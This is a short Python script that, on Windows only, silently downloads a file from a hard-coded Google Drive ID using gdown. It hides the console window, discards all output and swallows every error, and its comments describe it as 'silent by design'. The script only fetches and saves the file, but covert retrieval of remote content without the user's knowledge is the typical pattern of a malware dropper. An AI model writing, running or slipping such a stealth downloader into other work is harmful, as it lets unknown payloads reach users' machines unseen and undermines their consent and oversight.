import subprocess
import sys

# Replace the drive ID here
GDOWN_DRIVE_ID = "1W3Ddny5rolO3DrvyfQH9i2NFgn1uFh2n"
OUTPUT_NAME = "downloaded_file"

def main():
    # Silent helper: no visible window, no stdout/stderr from gdown.
    if sys.platform != "win32":
        return

    url = f"https://drive.google.com/uc?id={GDOWN_DRIVE_ID}"
    cmd = [sys.executable, "-m", "gdown", url, "-O", OUTPUT_NAME]

    # Use CREATE_NO_WINDOW to avoid any visible console on Windows.
    creationflags = getattr(subprocess, 'CREATE_NO_WINDOW', 0x08000000)

    try:
        subprocess.Popen(
            cmd,
            creationflags=creationflags,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            close_fds=True,
        )
    except Exception:
        # Silent by design; don't print or raise.
        pass


if __name__ == "__main__":
    main()
